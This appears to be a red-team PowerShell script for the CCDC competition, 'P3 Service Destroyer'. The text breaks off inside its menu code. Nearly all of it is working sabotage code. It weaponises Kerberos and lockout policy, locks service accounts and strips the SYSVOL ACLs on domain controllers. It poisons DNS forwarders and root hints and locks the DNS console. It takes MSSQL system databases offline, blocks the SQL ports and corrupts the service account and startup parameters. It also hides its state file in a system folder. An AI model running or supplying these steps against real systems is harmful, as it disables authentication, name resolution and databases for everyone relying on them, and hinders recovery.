# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 -- SERVICE DESTROYER
# Combines all three service-breaking modules into a single standalone script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
#   MODULE 1 -- KerberosKhaos         (Active Directory / Domain Controller)
#              MITRE: T1484.001, T1484.002, T1222, T1531
#              Source: CCDC_Windows_P3_AD_KerberosKhaos.ps1
#
#   MODULE 2 -- ConditionalSurrender  (DNS Server role)
#              MITRE: T1565.001, T1584.002, T1562.004
#              Source: CCDC_Windows_P3_DNS_ConditionalSurrender.ps1
#
#   MODULE 3 -- DeadInTheWater        (MSSQL Server)
#              MITRE: T1489, T1565.001, T1562.004, T1222
#              Source: CCDC_Windows_P3_MSSQL_DeadInTheWater.ps1
#
# Usage:
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1                   # interactive menu
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -All              # run all present roles
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules 1,3      # specific modules
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules Kerberos,DNS
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Status           # show state only
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Resume           # skip already-SUCCESS modules
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Force            # re-run even SUCCESS modules
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [string[]] $Modules = @(),
    [switch]   $All,
    [switch]   $Status,
    [switch]   $Resume,
    [switch]   $Force
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# -- Color helpers --------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# -- Banner ---------------------------------------------------------------------
function Show-Banner {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host " //                                                   //" -ForegroundColor Red
    Write-Host " //   " -ForegroundColor Red -NoNewline
    Write-Host "P3 SERVICE DESTROYER" -ForegroundColor Yellow -NoNewline
    Write-Host "                            //" -ForegroundColor Red
    Write-Host " //   KerberosKhaos  |  ConditionalSurrender  |  DeadInTheWater  //" -ForegroundColor Red
    Write-Host " //                                                   //" -ForegroundColor Red
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
    Write-Host ""
}

# -- State file -----------------------------------------------------------------
$script:StateFile = "C:\Windows\System32\spool\drivers\color\.p3_svc_state.csv"

function Read-StateFile {
    if (Test-Path $script:StateFile) {
        try {
            return Import-Csv $script:StateFile -ErrorAction Stop
        } catch { return @() }
    }
    return @()
}

function Write-StateFile { param([object[]]$Rows)
    try {
        $Rows | Export-Csv $script:StateFile -NoTypeInformation -Force -ErrorAction Stop
        $sf = Get-Item $script:StateFile -ErrorAction SilentlyContinue
        if ($sf) { $sf.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System }
    } catch { }
}

function Get-ModuleState { param([string]$Name)
    $rows = Read-StateFile
    $row  = $rows | Where-Object { $_.Module -eq $Name } | Select-Object -Last 1
    if ($row) { return $row.Status } else { return "PENDING" }
}

function Set-ModuleState { param([string]$Name, [string]$StateVal)
    $rows   = Read-StateFile
    $rows   = @($rows | Where-Object { $_.Module -ne $Name })
    $rows  += [PSCustomObject]@{ Module = $Name; Status = $StateVal; Time = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') }
    Write-StateFile $rows
}

# -- Role detection -------------------------------------------------------------
$script:HasAD    = $null -ne (Get-Service -Name NTDS        -ErrorAction SilentlyContinue)
$script:HasDNS   = $null -ne (Get-Service -Name DNS         -ErrorAction SilentlyContinue)
$script:HasMSSQL = $null -ne (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)

# ==============================================================================
#  MODULE 1 -- KERBEROS KHAOS  (AD/DC)
# ==============================================================================
function Invoke-KerberosKhaos {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   KerberosKhaos -- T1484.001/T1484.002/T1222/T1531" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasAD) {
        Write-Warn "NTDS service not found -- not a Domain Controller. Skipping KerberosKhaos."
        return
    }

    try { Import-Module ActiveDirectory -ErrorAction Stop }
    catch { Write-Err "Failed to import ActiveDirectory module: $_"; return }

    $ADDomain      = Get-ADDomain
    $DomainDNS     = $ADDomain.DNSRoot
    $DomainNetbios = $ADDomain.NetBIOSName
    Write-Info "Domain: $DomainDNS ($DomainNetbios)"

    # -- Layer 1: Kerberos Ticket TTL Weaponization ----------------------------
    Write-Section "KerberosKhaos 1/3  Kerberos Ticket TTL Weaponization"

    $l1TmpBase = "$env:TEMP\kk_l1_$(Get-Random -Maximum 99999)"
    $l1Inf     = "${l1TmpBase}.inf"
    $l1Sdb     = "${l1TmpBase}.sdb"

    $l1InfLines = @(
        '[Unicode]',
        'Unicode=yes',
        '[Version]',
        'signature="$CHICAGO$"',
        'Revision=1',
        '[Kerberos Policy]',
        'MaxServiceAge = 10',
        'MaxTicketAge = 1',
        'MaxRenewAge = 1',
        'MaxClockSkew = 0',
        'TicketValidateClient = 1'
    )
    $l1InfLines | Out-File $l1Inf -Encoding Unicode

    & secedit.exe /configure /db $l1Sdb /cfg $l1Inf /areas SECURITYPOLICY /overwrite /quiet
    if ($LASTEXITCODE -eq 0) {
        Write-Success "Kerberos policy applied via secedit"
        Write-Info   "  MaxTicketAge=1hr  MaxClockSkew=0min  MaxRenewAge=1day"
    } else {
        Write-Err "secedit failed (exit $LASTEXITCODE)"
    }
    Remove-Item $l1Inf, $l1Sdb -Force -ErrorAction SilentlyContinue

    & gpupdate.exe /force /quiet 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "gpupdate /force executed"
    } else {
        Write-Warn "gpupdate returned exit $LASTEXITCODE -- policy may apply on next refresh"
    }

    # -- Layer 2: Account Lockout Weaponization --------------------------------
    Write-Section "KerberosKhaos 2/3  Account Lockout Weaponization"

    try {
        Set-ADDefaultDomainPasswordPolicy -Identity $DomainDNS `
            -LockoutThreshold 1 `
            -LockoutDuration ([System.TimeSpan]::Zero) `
            -LockoutObservationWindow (New-TimeSpan -Minutes 99999)
        Write-Success "Lockout policy: threshold=1, duration=never, window=99999min"
    } catch {
        Write-Err "Failed to set lockout policy: $_"
    }

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    $allEnabled  = Get-ADUser -Filter "Enabled -eq `$True" -Properties SamAccountName
    $svcAccounts = $allEnabled | Where-Object {
        $n = $_.SamAccountName
        $n -like '*svc*'   -or $n -like '*dns*'   -or $n -like '*sql*' -or
        $n -like '*iis*'   -or $n -like '*mssql*' -or $n -like '*http*'
    } | Select-Object -ExpandProperty SamAccountName

    if ($svcAccounts) {
        $ctx = $null
        try {
            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
                [System.DirectoryServices.AccountManagement.ContextType]::Domain,
                $DomainDNS)
        } catch {
            Write-Warn "Could not create domain PrincipalContext: $_"
        }

        foreach ($sam in $svcAccounts) {
            if ($ctx) {
                try {
                    $badPwd = "KK_BadPwd_$(Get-Random -Maximum 999999)"
                    $null   = $ctx.ValidateCredentials($sam, $badPwd)
                    Write-Success "Pre-locked: $sam"
                } catch {
                    Write-Warn "Pre-lock attempt for ${sam}: $_"
                }
            } else {
                Write-Warn "Skipped pre-lock for ${sam} (no domain context)"
            }
        }
        if ($ctx) { $ctx.Dispose() }
    } else {
        Write-Warn "No service accounts matched naming patterns -- skipping pre-lock"
        Write-Info "Policy is live; first bad auth by any svc account will lock it permanently"
    }

    # -- Layer 3: SYSVOL/NETLOGON ACL Destruction -----------------------------
    Write-Section "KerberosKhaos 3/3  SYSVOL/NETLOGON ACL Destruction"

    $sysvolRoot = "C:\Windows\SYSVOL\sysvol\$DomainDNS"
    $aclTargets = @(
        $sysvolRoot,
        "$sysvolRoot\Policies",
        "$sysvolRoot\scripts"
    )

    foreach ($p in $aclTargets) {
        if (Test-Path $p) {
            & icacls.exe $p /remove "Authenticated Users" /T /C /Q 2>$null
            $rc1 = $LASTEXITCODE
            & icacls.exe $p /remove "Everyone" /T /C /Q 2>$null
            $rc2 = $LASTEXITCODE
            if ($rc1 -eq 0 -and $rc2 -eq 0) {
                Write-Success "Stripped ACEs from: $p"
            } else {
                Write-Warn "icacls partial failure on $p (rc1=$rc1 rc2=$rc2)"
            }
        } else {
            Write-Warn "Path not found (skipped): $p"
        }
    }

    $netlogonKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
    try {
        Set-ItemProperty -Path $netlogonKey -Name "DisablePasswordChange" -Value 1 -Type DWord
        Write-Success "DisablePasswordChange = 1 set in Netlogon\Parameters"
    } catch {
        Write-Err "Failed to set DisablePasswordChange: $_"
    }

    Write-Success "KerberosKhaos complete -- all 3 layers applied"
    Write-Info "  L1: Restore Default Domain Policy Kerberos settings (gpmc.msc)"
    Write-Info "  L2: Fix lockout policy + manually unlock locked service accounts"
    Write-Info "  L3: Restore SYSVOL ACLs + remove DisablePasswordChange from Netlogon"
}

# ==============================================================================
#  MODULE 2 -- CONDITIONAL SURRENDER  (DNS)
# ==============================================================================
function Invoke-ConditionalSurrender {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   ConditionalSurrender -- T1565.001/T1584.002/T1562.004" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasDNS) {
        Write-Warn "DNS Server service not found -- DNS Server role not installed. Skipping ConditionalSurrender."
        return
    }

    $dnsModuleAvailable = $false
    if (Get-Module -Name DnsServer -ListAvailable -ErrorAction SilentlyContinue) {
        try {
            Import-Module DnsServer -ErrorAction Stop
            $dnsModuleAvailable = $true
            Write-Info "DnsServer PowerShell module loaded"
        } catch {
            Write-Warn "DnsServer module import failed -- will use dnscmd fallback: $_"
        }
    } else {
        Write-Warn "DnsServer PowerShell module not available -- using dnscmd fallback"
    }

    $CompDomains = @("ccdc.local", "range.internal", "competition.local")
    $BlackholeIP = "192.0.2.1"

    # -- Layer 1: Conditional Forwarder Poisoning ------------------------------
    Write-Section "ConditionalSurrender 1/3  Conditional Forwarder Poisoning"

    foreach ($domain in $CompDomains) {
        Write-Info "  Poisoning forwarder: $domain -> $BlackholeIP"
        $applied = $false

        if ($dnsModuleAvailable) {
            try {
                $existing = Get-DnsServerZone -Name $domain -ErrorAction SilentlyContinue
                if ($existing -and $existing.ZoneType -eq "Forwarder") {
                    Set-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Updated existing forwarder zone: $domain -> $BlackholeIP"
                    $applied = $true
                } else {
                    if ($existing) {
                        Remove-DnsServerZone -Name $domain -Force -ErrorAction SilentlyContinue
                        Write-Warn "    Removed existing zone: $domain (was $($existing.ZoneType))"
                    }
                    Add-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Added conditional forwarder: $domain -> $BlackholeIP"
                    $applied = $true
                }
            } catch {
                Write-Warn "    PS module path failed for $domain -- trying dnscmd: $_"
            }
        }

        if (-not $applied) {
            & dnscmd.exe /zonedelete $domain /f 2>$null | Out-Null
            & dnscmd.exe /zoneadd $domain /forwarder $BlackholeIP 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Success "  dnscmd: Added forwarder zone $domain -> $BlackholeIP"
            } else {
                Write-Err "  dnscmd: Failed to add forwarder for $domain (rc=$LASTEXITCODE)"
            }
        }
    }

    # -- Layer 2: TTL / Scavenging Destruction ---------------------------------
    Write-Section "ConditionalSurrender 2/3  TTL / Scavenging Destruction"

    $dnscmdConfigs = @(
        @{ Flag = "/DefaultTTL";               Value = "1"; Label = "DefaultTTL = 1s"              },
        @{ Flag = "/ScavengingInterval";        Value = "1"; Label = "ScavengingInterval = 1h"       },
        @{ Flag = "/DefaultNoRefreshInterval";  Value = "1"; Label = "DefaultNoRefreshInterval = 1h" },
        @{ Flag = "/DefaultRefreshInterval";    Value = "1"; Label = "DefaultRefreshInterval = 1h"   }
    )

    foreach ($cfg in $dnscmdConfigs) {
        & dnscmd.exe /Config $($cfg.Flag) $($cfg.Value) 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "  $($cfg.Label)"
        } else {
            Write-Warn "  dnscmd /Config $($cfg.Flag) failed (rc=$LASTEXITCODE)"
        }
    }

    if ($dnsModuleAvailable) {
        try {
            $primaryZones = Get-DnsServerZone | Where-Object {
                $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
            }
            foreach ($z in $primaryZones) {
                try {
                    Set-DnsServerZoneAging -Name $z.ZoneName -Aging $true `
                        -NoRefreshInterval (New-TimeSpan -Hours 1) `
                        -RefreshInterval   (New-TimeSpan -Hours 1) -ErrorAction Stop
                    Write-Success "  Enabled aging on zone: $($z.ZoneName)"
                } catch {
                    Write-Warn "    Zone aging failed for $($z.ZoneName): $_"
                }

                try {
                    $soa    = Get-DnsServerResourceRecord -ZoneName $z.ZoneName -RrType Soa -ErrorAction Stop
                    $soaNew = $soa.Clone()
                    $soaNew.RecordData.MinimumTimeToLive = [System.TimeSpan]::Zero
                    $soaNew.TimeToLive = New-TimeSpan -Seconds 1
                    Set-DnsServerResourceRecord -ZoneName $z.ZoneName `
                        -OldInputObject $soa -NewInputObject $soaNew -ErrorAction Stop
                    Write-Success "  Zeroed SOA minimum TTL for $($z.ZoneName)"
                } catch {
                    Write-Warn "    SOA TTL zeroing failed for $($z.ZoneName): $_"
                }
            }
        } catch {
            Write-Warn "Zone enumeration failed: $_"
        }
    } else {
        Write-Warn "DnsServer module unavailable -- per-zone aging skipped (global TTL applied)"
    }

    # -- Layer 3: Recursion Trap + Console ACL Lock ----------------------------
    Write-Section "ConditionalSurrender 3/3  Recursion Trap + Console ACL Lock"

    & dnscmd.exe /Config /NoRecursion 1 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "NoRecursion = 1 (all recursive queries disabled)"
    } else {
        Write-Warn "dnscmd /Config /NoRecursion 1 failed (rc=$LASTEXITCODE)"
    }

    $cacheDns  = "$env:SystemRoot\System32\dns\CACHE.DNS"
    $cacheBack = "$env:SystemRoot\System32\dns\CACHE.DNS.bak"

    if (Test-Path $cacheDns) {
        if (-not (Test-Path $cacheBack)) {
            try {
                Copy-Item $cacheDns $cacheBack -ErrorAction Stop
                Write-Info "Backed up original cache.dns to CACHE.DNS.bak"
            } catch {
                Write-Warn "  Backup of cache.dns failed: $_"
            }
        }

        $fakeRoots = @(
            '; root hints poisoned -- all roots point to RFC 5737 blackhole (192.0.2.1)',
            '.                        3600000 IN  NS  a.root-servers.net.',
            'a.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  b.root-servers.net.',
            'b.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  c.root-servers.net.',
            'c.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  d.root-servers.net.',
            'd.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  e.root-servers.net.',
            'e.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  f.root-servers.net.',
            'f.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  g.root-servers.net.',
            'g.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  h.root-servers.net.',
            'h.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  i.root-servers.net.',
            'i.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  j.root-servers.net.',
            'j.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  k.root-servers.net.',
            'k.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  l.root-servers.net.',
            'l.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  m.root-servers.net.',
            'm.root-servers.net.      3600000     A   192.0.2.1'
        )
        try {
            Set-Content -Path $cacheDns -Value $fakeRoots -Encoding ASCII -ErrorAction Stop
            Write-Success "Root hints (cache.dns) overwritten -- all 13 roots -> $BlackholeIP"
        } catch {
            Write-Err "Failed to overwrite cache.dns: $_"
        }
    } else {
        Write-Warn "cache.dns not found at $cacheDns -- skipping root hints poison"
    }

    try {
        Restart-Service -Name "DNS" -Force -ErrorAction Stop
        Write-Success "DNS service restarted (poisoned root hints now active)"
    } catch {
        Write-Warn "DNS service restart failed -- hints apply after next manual restart: $_"
    }

    $dnsMmc = "$env:SystemRoot\System32\dnsmgmt.msc"
    if (Test-Path $dnsMmc) {
        & icacls.exe $dnsMmc /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "ACL-locked dnsmgmt.msc -- DNS Manager console throws Access Denied"
        } else {
            Write-Warn "icacls /deny on dnsmgmt.msc returned $LASTEXITCODE"
        }
    } else {
        Write-Warn "dnsmgmt.msc not found at expected path -- skipping MMC lock"
    }

    try {
        $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default
        )
        $dnsKey = $regHive.OpenSubKey(
            "SYSTEM\CurrentControlSet\Services\DNS",
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
            [System.Security.AccessControl.RegistryRights]::ReadPermissions
        )
        if ($dnsKey) {
            $acl  = $dnsKey.GetAccessControl()
            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
                "BUILTIN\Users",
                "ReadKey",
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            $dnsKey.SetAccessControl($acl)
            $dnsKey.Close()
            Write-Success "Registry ACL: Denied BUILTIN\Users ReadKey on DNS service key"
        } else {
            Write-Warn "Could not open DNS registry key for ACL modification"
        }
        $regHive.Close()
    } catch {
        Write-Warn "Registry ACL on DNS key failed: $_"
    }

    Write-Success "ConditionalSurrender complete -- all 3 layers applied"
    Write-Info "  L1: Remove conditional forwarders (dnscmd /zonedelete ccdc.local /f)"
    Write-Info "  L2: Restore DefaultTTL, disable scavenging, restore SOA min TTL"
    Write-Info "  L3: Re-enable recursion, restore CACHE.DNS.bak, remove MMC/registry ACLs"
}

# ==============================================================================
#  MODULE 3 -- DEAD IN THE WATER  (MSSQL)
# ==============================================================================
function Get-SqlRegBase {
    $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
    $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
               Where-Object { $_.PSChildName -match '^MSSQL\d{2}\.MSSQLSERVER$' } |
               Select-Object -First 1
    if (-not $verDir) { return $null }
    return Join-Path $sqlRoot "$($verDir.PSChildName)\MSSQLServer"
}

function Invoke-DeadInTheWater {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   DeadInTheWater -- T1489/T1565.001/T1562.004/T1222" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasMSSQL) {
        Write-Warn "MSSQLSERVER service not found -- not an MSSQL target. Skipping DeadInTheWater."
        return
    }

    $SqlBase = Get-SqlRegBase
    if (-not $SqlBase) {
        Write-Err "Cannot locate SQL Server registry base -- aborting DeadInTheWater"
        return
    }
    Write-Info "SQL Server registry base: $SqlBase"

    # -- Layer 2 (runs first while SQL is up): Database Sabotage --------------
    Write-Section "DeadInTheWater 1/3  Database Sabotage (runs while SQL is live)"

    Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
    try {
        $connStr = "Server=localhost;Integrated Security=true;Database=master;Connect Timeout=10"
        $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
        try {
            $conn.Open()
            $statements = @(
                "ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE msdb   SET OFFLINE         WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE model  SET READ_ONLY        WITH ROLLBACK IMMEDIATE"
            )
            foreach ($sql in $statements) {
                try {
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText    = $sql
                    $cmd.CommandTimeout = 30
                    [void]$cmd.ExecuteNonQuery()
                    Write-Success "Executed: $sql"
                } catch {
                    Write-Err "T-SQL failed: $sql -- $_"
                }
            }
        } finally {
            if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
        }
    } catch {
        Write-Err "SqlClient connection failed: $_ -- T-SQL layer skipped"
    }

    Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
    try {
        $tcpPath = "$SqlBase\SuperSocketNetLib\Tcp"
        if (Test-Path $tcpPath) {
            Set-ItemProperty -Path $tcpPath -Name Enabled -Value 0 -Type DWord
            Write-Success "TCP/IP protocol disabled (SuperSocketNetLib\Tcp\Enabled = 0)"
        } else {
            Write-Warn "TCP registry path not found: $tcpPath"
        }
    } catch {
        Write-Err "Failed to disable TCP/IP: $_"
    }

    # -- Layer 3: Port / Discovery Sabotage ------------------------------------
    Write-Section "DeadInTheWater 2/3  Port / Discovery Sabotage"

    Write-Info "Remapping SQL Server listening port 1433 -> 14334..."
    try {
        $ipAllPath = "$SqlBase\SuperSocketNetLib\Tcp\IPAll"
        if (Test-Path $ipAllPath) {
            Set-ItemProperty -Path $ipAllPath -Name TcpPort         -Value "14334"
            Set-ItemProperty -Path $ipAllPath -Name TcpDynamicPorts -Value ""
            Write-Success "TcpPort set to 14334; TcpDynamicPorts cleared"
        } else {
            Write-Warn "IPAll registry path not found: $ipAllPath"
        }
    } catch {
        Write-Err "Failed to remap TCP port: $_"
    }

    Write-Info "Stopping and disabling SQL Server Browser service..."
    try {
        $browserSvc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
        if ($browserSvc) {
            Stop-Service -Name SQLBrowser -Force
            Set-Service  -Name SQLBrowser -StartupType Disabled
            Write-Success "SQLBrowser stopped and disabled"
        } else {
            Write-Info "SQLBrowser service not found -- skipping"
        }
    } catch {
        Write-Err "Failed to disable SQL Browser: $_"
    }

    Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
    try {
        # Inbound: block scoring server connecting TO SQL (LocalPort = port on this machine)
        # Outbound: block this machine connecting OUT to SQL on other hosts (RemotePort = dest port)
        $fwInbound = @(
            @{ Name = "CCDC_Block_SQL_1433_In";   Port = 1433  },
            @{ Name = "CCDC_Block_SQL_14334_In";  Port = 14334 }
        )
        $fwOutbound = @(
            @{ Name = "CCDC_Block_SQL_1433_Out";  Port = 1433  },
            @{ Name = "CCDC_Block_SQL_14334_Out"; Port = 14334 }
        )
        foreach ($r in $fwInbound) {
            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP `
                    -Action Block -Profile Any -Enabled True -LocalPort $r.Port | Out-Null
                Write-Success "Firewall rule created: $($r.Name)"
            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
        }
        foreach ($r in $fwOutbound) {
            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $r.Name -Direction Outbound -Protocol TCP `
                    -Action Block -Profile Any -Enabled True -RemotePort $r.Port | Out-Null
                Write-Success "Firewall rule created: $($r.Name)"
            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
        }
    } catch {
        Write-Err "Firewall rule creation failed: $_"
    }

    # -- Layer 1 (runs last): Service Account + Startup Param Corruption -------
    Write-Section "DeadInTheWater 3/3  Service Account + Startup Param Corruption"

    Write-Info "Changing SQL Server service account to nonexistent local user..."
    $accountChanged = $false
    try {
        [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
        $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
        $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' } | Select-Object -First 1
        if ($svc) {
            $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
            $svc.Alter()
            Write-Success "Service account changed via SMO WMI to .\NonExistentUser2019"
            $accountChanged = $true
        }
    } catch {
        Write-Warn "SMO WMI approach failed ($_) -- falling back to registry"
    }

    if (-not $accountChanged) {
        try {
            $svcRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            Set-ItemProperty -Path $svcRegPath -Name ObjectName -Value '.\NonExistentUser2019'
            Write-Success "Service ObjectName set via registry to .\NonExistentUser2019"
        } catch {
            Write-Err "Registry fallback for service account also failed: $_"
        }
    }

    Write-Info "Injecting invalid startup parameter into SQL Server Parameters registry..."
    try {
        $paramPath = "$SqlBase\Parameters"
        if (Test-Path $paramPath) {
            $regItem  = Get-Item $paramPath -ErrorAction SilentlyContinue
            $existing = if ($regItem) {
                            $regItem.Property | Where-Object { $_ -match '^SQLArg\d+$' }
                        } else { @() }
            $nextIdx  = if ($existing) {
                            ($existing | ForEach-Object { [int]($_ -replace 'SQLArg', '') } |
                             Measure-Object -Maximum).Maximum + 1
                        } else { 0 }
            $argName  = "SQLArg$nextIdx"
            Set-ItemProperty -Path $paramPath -Name $argName `
                             -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
            Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
        } else {
            Write-Warn "Parameters registry key not found -- skipping startup param injection"
        }
    } catch {
        Write-Err "Failed to inject startup parameter: $_"
    }

    Write-Info "Stopping MSSQLSERVER service..."
    try {
        Stop-Service -Name MSSQLSERVER -Force
        Write-Success "MSSQLSERVER service stopped"
    } catch {
        Write-Err "Could not stop MSSQLSERVER: $_"
    }

    Write-Success "DeadInTheWater complete -- all 3 layers applied"
    Write-Info "  L1: Fix service account + remove invalid SQLArg startup param"
    Write-Info "  L2: Fix master RESTRICTED_USER, msdb OFFLINE, model READ_ONLY, re-enable TCP/IP"
    Write-Info "  L3: Remap port back to 1433, re-enable SQLBrowser, remove FW rules"
}

# ==============================================================================
#  MENU + DISPATCH
# ==============================================================================

$script:ExecOrder = @("KerberosKhaos", "ConditionalSurrender", "DeadInTheWater")

$script:ModuleDefs = @{
    "KerberosKhaos"        = @{ Num = 1; Label = "KerberosKhaos       "; Role = "AD/DC"; Present = $script:HasAD    }
    "ConditionalSurrender" = @{ Num = 2; Label = "ConditionalSurrender"; Role = "DNS  "; Present = $script:HasDNS   }
    "DeadInTheWater"       = @{ Num = 3; Label = "DeadInTheWater      "; Role = "MSSQL"; Present = $script:HasMSSQL }
}

function Resolve-ModuleName { param([string]$Token)
    $aliases = @{
        "1"           = "KerberosKhaos";   "kerberos" = "KerberosKhaos";   "kk"  = "KerberosKhaos"
        "kerberoskhaos" = "KerberosKhaos"; "ad"       = "KerberosKhaos";   "dc"  = "KerberosKhaos"
        "2"           = "ConditionalSurrender"; "dns" = "ConditionalSurrender"; "cs"  = "ConditionalSurrender"
        "conditionalsurrender" = "ConditionalSurrender"; "surrender" = "ConditionalSurrender"
        "3"           = "DeadInTheWater";  "mssql"    = "DeadInTheWater";   "ditw" = "DeadInTheWater"
        "deadinthewater" = "DeadInTheWater"; "sql"    = "DeadInTheWater";   "dead" = "DeadInTheWater"
    }
    $key = $Token.ToLower().Trim()
    if ($aliases.ContainsKey($key)) { return $aliases[$key] }
    return $null
}

function Show-Menu {
    $states = @{}
    foreach ($m in $script:ExecOrder) { $states[$m] = Get-ModuleState $m }

    Write-Host ""
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host "  |        P3 SERVICE DESTROYER -- Select Modules            |" -ForegroundColor Cyan
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan

    foreach ($m in $script:ExecOrder) {
        $def     = $script:ModuleDefs[$m]
        $roleTag = if ($def.Present) { "[PRESENT]" } else { "[ABSENT] " }
        $roleCol = if ($def.Present) { "Green"     } else { "DarkGray"  }
        if     ($states[$m] -eq "SUCCESS") { $stTag = " [DONE]"; $stCol = "Green"  }
        elseif ($states[$m] -eq "FAILED")  { $stTag = " [FAIL]"; $stCol = "Red"    }
